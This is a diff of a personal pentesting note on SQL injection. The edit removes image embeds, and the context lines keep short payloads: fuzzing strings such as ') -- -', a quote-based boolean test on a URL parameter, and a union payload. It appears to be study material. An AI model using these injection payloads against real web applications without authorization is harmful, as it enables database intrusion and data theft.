@@ -43,8 +43,6 @@ Try the following characters manually or in Burp Intruder where ever you see a p
 %3B -- -
 ) -- -
 ```
-![[Pasted image 20220712133826.png]]
-![[Pasted image 20220712133729.png]]
 Notice how only the 18th payload has the same length as the baseline.  Meaning we should be able to manually load that payload `) -- - ` and the page would load correctly.
 Test further with sleep:
 ```sql
@@ -52,17 +50,14 @@ Test further with sleep:
 ```
 #### Boolean Based Detection
 Original URL:
-![[Pasted image 20220922210529.png]]
 ```
 http://$TARGET/view.php?id=1141
 ```
 Quick injection test:
-![[Pasted image 20220922210601.png]]
 ```
 http://$TARGET/view.php?id=1141'
 ```
 Same results if we change the parameter to something non existent.
-![[Pasted image 20220922210627.png]]
 ```
 http://$TARGET/view.php?id=9999
 ```
@@ -91,7 +86,6 @@ All we have to do here is utilize union for command injection:
 ```
 ) union select 'whoami' -- -
 ```
-![[Pasted image 20220712134347.png]]
 #### SQL Login bypass
 Use Intruder (Battering ram) + PayloadAllTheThings:
 [[SQL Payload]]
